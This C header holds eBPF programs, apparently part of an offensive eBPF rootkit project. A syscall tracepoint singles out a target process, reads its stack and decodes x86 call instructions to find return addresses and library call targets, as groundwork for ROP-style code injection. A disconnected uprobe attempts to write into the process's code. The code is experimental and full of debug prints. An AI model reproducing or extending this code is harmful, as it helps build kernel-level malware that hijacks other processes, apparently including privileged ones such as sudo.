#ifndef __BPF_INJECTION_H
#define __BPF_INJECTION_H


#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../../../common/constants.h"

#define OPCODE_JUMP_BYTE_0 0xe8

struct sys_timerfd_settime_enter_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    unsigned int padding; //Alignment
    int ufd;
    int flags;
    const struct __kernel_itimerspec *utmr;
    struct __kernel_itimerspec *otmr;
};

static __always_inline int stack_extract_return_address(__u64 stack){
    //We now have a possible call instruction, we check if it starts with the correct format
    __u8 *op = (__u8*)(stack - 0x5);
    __u8 opcode_arr[5];
    bpf_probe_read(&opcode_arr, 5*sizeof(__u8), op);
    if (opcode_arr[0] != OPCODE_JUMP_BYTE_0) {
        bpf_printk(" -- Failed OPCODE: %x\n", opcode_arr[0]);
        return 0;
    }
    
    bpf_printk("OPCODE: %x\n", opcode_arr[0]);
    bpf_printk("OPCODE: %x\n", opcode_arr[1]);
    bpf_printk("OPCODE: %x\n", opcode_arr[2]);
    bpf_printk("OPCODE: %x\n", opcode_arr[3]);
    bpf_printk("OPCODE: %x\n", opcode_arr[4]);
    //We have localized the call instruction. We proceed to get the offset of the call.
    __u32 offset;
    bpf_probe_read(&offset, sizeof(__u32), &op[1]);
    bpf_printk("OFFSET: %x\n", offset);
    __u8* call_addr = (__u8*)((op+offset+5));

    //We check which address was called. We could either be at libc already after
    //following it, or in the PLT entry on the same executable as before.
    __u32 call_dest;
    bpf_printk("CALL_ADDR: %lx\n", call_addr);
    bpf_probe_read(&call_dest, sizeof(__u32), call_addr);
    bpf_printk("BYTES: %llx\n", call_dest);

    bpf_probe_read(&opcode_arr, 2*sizeof(__u8), call_addr);
    bpf_printk("OPCODE0: %x\n", opcode_arr[0]);
    bpf_printk("OPCODE1: %x\n", opcode_arr[1]);



    return 0;
}


SEC("tp/syscalls/sys_enter_timerfd_settime")
int sys_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
    __u64 *scanner = (__u64*)ctx->otmr;
    int fd = ctx->ufd;

    char comm[TASK_COMM_LEN] = {0};
    int err = bpf_get_current_comm(comm, sizeof(comm));
    if(err<0){
        return -1;
    }

    char *task = TASK_COMM_NAME_ROP_TARGET;
    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
        return 0;
    }
    bpf_printk("TASK: %s\n", comm);

    long timesecs;
    //bpf_probe_read_user(&timesecs, sizeof(long), &(new->it_interval.tv_sec));
    //bpf_printk("AG %ld\n",timesecs);
    __u64 address = 0;
    bpf_printk("Timer %i to scan at address %lx\n", fd, scanner);
    #pragma unroll
    for(__u64 ii=0; ii<14; ii++){
        bpf_probe_read(&address, sizeof(__u64), (void*)scanner - ii*8);
        bpf_printk("stack: %lx\n", address);
        stack_extract_return_address(address);
    }

    


    return 0;
}





//NOT CURRENTLY CONNECTED
SEC("uprobe/execute_command")
int uprobe_execute_command(struct pt_regs *ctx){
    bpf_printk("UPROBE activated\n");
    bpf_printk("Ret is %lx", ctx->ip);

    char* buf = "A\0";
    long ret;
    if((ret = bpf_probe_write_user((void*)ctx->ip, buf,1))>=0){
        bpf_printk("Success writting? Should not have happened\n");
        return -1;
    }
    bpf_printk("ERROR writing: %li\n", ret); //EFAULT
    char dest_buf[2];
    if(ctx->ip-5 <=0){
        return -1;
    }
    if((ret = bpf_probe_read_user(dest_buf, 2, (void*)ctx->ip-5))<0){
        bpf_printk("Error reading instruction\n");
        return -1;
    }
    bpf_printk("Stack: %x\n", dest_buf);

    return 0;
}

#endif